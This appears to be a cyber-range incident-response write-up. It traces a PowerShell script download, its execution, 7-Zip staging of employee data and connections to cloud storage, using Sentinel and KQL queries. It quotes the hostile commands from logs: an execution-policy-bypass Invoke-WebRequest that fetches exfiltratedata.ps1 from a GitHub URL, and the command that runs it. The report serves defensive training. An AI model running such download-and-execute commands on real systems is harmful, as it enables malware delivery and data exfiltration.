# Incident Response Scenario: Detect Web-Request from Powershell

## Platforms and Tools Used
- Windows 10 Virtual Machines (Microsoft Azure)
- Microsoft Sentinel
- Endpoint Detection and Response (EDR): Microsoft Defender for Endpoint (MDE)
- Kusto Query Language (KQL)

---

## Detection and Analysis

### Initial Alert

The investigation began with an alert from Microsoft Sentinel for the rule "Detect Web-Request from Powershell.exe - PN". The alert triggered based on the following Sentinel scheduled query rule:

```kql
DeviceProcessEvents
| where DeviceName == "ir-win10"
| where FileName == "powershell.exe"
| where InitiatingProcessCommandLine contains "Invoke-WebRequest"
| order by TimeGenerated
```

**Relevant TTPs:**
- **T1059.001**: Command and Scripting Interpreter: PowerShell
- **T1105**: Ingress Tool Transfer

![ir1](https://github.com/user-attachments/assets/1fab327c-eb1c-465a-99d7-83ac5688ca46)

This query detected the following suspicious command:

```powershell
powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1
```

The command indicated that a PowerShell script (exfiltratedata.ps1) was downloaded from the internet to C:\ProgramData, a folder that is hidden by default on Windows. This suggests an attempt to conceal the file's presence and triggered further investigation.

### User Inquiry

I reached out to the user of ir-win10 to get some more context. They told me they had tried installing something, saw a black screen, and then said, "nothing happened afterward." This pointed to the possibility that a malicious script might have run without them realizing it.

### Process Events Analysis

To confirm the downloaded script's execution and identify further malicious activities, I queried process events:

```kql
DeviceProcessEvents
| where DeviceName == "ir-win10"
| project Timestamp, FileName, FolderPath, ProcessCommandLine
| order by Timestamp
```

**Corresponding TTPs:**
- **T1059.001**: Command and Scripting Interpreter: PowerShell
- **T1027**: Obfuscated Files or Information

![processquery](https://github.com/user-attachments/assets/e9197ad7-2365-4bbc-86fb-41a25c40ff57)

**Findings:**

| Timestamps                     | FileName         | FolderPath                                  | ProcessCommandLine                                        |
|--------------------------------|------------------|--------------------------------------------|---------------------------------------------------------|
| 8 Jan 2025 20:48:43, 19:48:40, 18:48:47 | 7z.exe           | C:\Program Files\7-Zip\                   | "7z.exe" a C:\ProgramData\employee-data-[TIMESTAMP].zip C:\ProgramData\employee-data-temp[TIMESTAMP].csv |
| 8 Jan 2025 20:48:37, 19:48:32, 18:48:40 | 7z2408-x64.exe   | C:\ProgramData\                           | "7z2408-x64.exe" /S                                    |
| 8 Jan 2025 20:48:35, 19:48:31, 18:48:38 | powershell.exe  | C:\Windows\System32\WindowsPowerShell\v1.0\ | powershell.exe -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1 |
| 8 Jan 2025 20:48:31, 19:48:27, 18:48:35 | powershell.exe  | C:\Windows\System32\WindowsPowerShell\v1.0\ | powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1 |

These logs confirmed the following sequence of events:
1. The script exfiltratedata.ps1 was downloaded and executed multiple times.
2. The script installed 7-Zip silently using 7z2408-x64.exe.
3. The installed 7-Zip (7z.exe) was used to compress sensitive data into ZIP files.

### Network Events Analysis

To identify any potential data exfiltration, I queried network events:

```kql
DeviceNetworkEvents
| where DeviceName == "ir-win10"
| project Timestamp, ActionType, RemoteIP, RemotePort, RemoteUrl, InitiatingProcessCommandLine
| order by Timestamp
```

**Corresponding TTPs:**
- **T1105**: Ingress Tool Transfer
- **T1041**: Exfiltration Over C2 Channel

![networkquery](https://github.com/user-attachments/assets/6fccbaf5-f771-4ba9-9805-e0baed7ed3de)

**Findings:**

| Timestamp          | ActionType       | RemoteIP          | RemotePort | RemoteUrl                                      | CommandLine                                           |
|--------------------|------------------|-------------------|------------|------------------------------------------------|-----------------------------------------------------|
| 8 Jan 2025 18:48:47 | ConnectionSuccess | 20.60.133.132     | 443        | https://sacyberrangedanger.blob.core.windows.net | powershell.exe  -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1    |
| 8 Jan 2025 18:48:39 | ConnectionSuccess | 20.60.181.193     | 443        | https://sacyberrange00.blob.core.windows.net    | powershell.exe  -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1    |
| 8 Jan 2025 18:48:35 | ConnectionSuccess | 185.199.109.133   | 443        | https://raw.githubusercontent.com              | powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1 |

These logs showed repeated connections to external endpoints, strongly supporting the hypothesis of data exfiltration.

### File Events Analysis

To identify artifacts related to data staging or exfiltration, I queried file events:

```kql
DeviceFileEvents
| where DeviceName == "ir-win10"
| project Timestamp, FileName, FolderPath, InitiatingProcessCommandLine, ActionType
| order by Timestamp desc
```

**Corresponding TTPs:**
- **T1027**: Obfuscated Files or Information
- **T1560.001**: Archive Collected Data: Archive via Utility

**Findings:**

![Filequery](https://github.com/user-attachments/assets/aba14b2e-9fbd-41aa-a33d-bfe771693a61)

**Findings:**

| Timestamps             | FileName                     | FolderPath                             | InitiatingProcessCommandLine                                          | ActionType |
|--------------------------------|------------------------------|----------------------------------------|------------------------------------------------------------------------|------------|
| 8 Jan 2025 20:48:44, 19:48:41, 18:48:47 | employee-data-[TIMESTAMP].zip | C:\ProgramData\backup\employee-data-[TIMESTAMP].zip | powershell.exe -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1 | FileRenamed |
| 8 Jan 2025 20:48:43, 19:48:40, 18:48:47 | employee-data-[TIMESTAMP].zip | C:\ProgramData\employee-data-[TIMESTAMP].zip        | "7z.exe" a C:\ProgramData\employee-data-[TIMESTAMP].zip C:\ProgramData\employee-data-temp[TIMESTAMP].csv | FileCreated |

These findings confirmed the repeated creation and renaming of ZIP files, consistent with attempts to stage data for exfiltration.

## Containment, Eradication, and Recovery

### Immediate Containment

1. **Quarantine Affected Device**:
   - Isolated ir-win10 from the network with Defender for Endpoint.

2. **Block Malicious IPs and URLs**:
   - Blocked the following IPs and domains in the firewall:
     - 185.199.109.133
     - 20.60.181.193
     - 20.60.133.132
     - https://raw.githubusercontent.com
     - https://sacyberrange00.blob.core.windows.net
     - https://sacyberrangedanger.blob.core.windows.net

### Investigation and Remediation

1. **Locate and Delete Malicious Artifacts**:
   - Removed all instances of exfiltratedata.ps1 from C:\programdata.
   - Deleted any related ZIP files (e.g., employee-data-*.zip) and temporary files.

2. **Scan the System**:
   - Performed a full system scan using Microsoft Defender for Endpoint.

3. **Analyze Network Traffic**:
   - Inspected logs to confirm no sensitive data was exfiltrated.

4. **Harden Endpoint Security**:
   - Disabled PowerShell for non-administrative users.
   - Enforced stricter PowerShell execution policies.
   - Implemented application whitelisting to block unauthorized executables.

## Post-Incident Activities

### Recommendations

1. **Enhance Monitoring**:
   - Create detection rules for unauthorized archiving tools and large file transfers.

2. **User Education**:
   - Train users to recognize suspicious activity.
   - Reinforce company policies against running untrusted scripts.

3. **Incident Documentation**:
   - Record all findings and actions taken.
   - Update incident response playbooks to include lessons learned.

### Post-Incident Monitoring

- Keep ir-win10 under close monitoring post-remediation.
- Conduct network-wide scans to ensure no other devices were compromised.
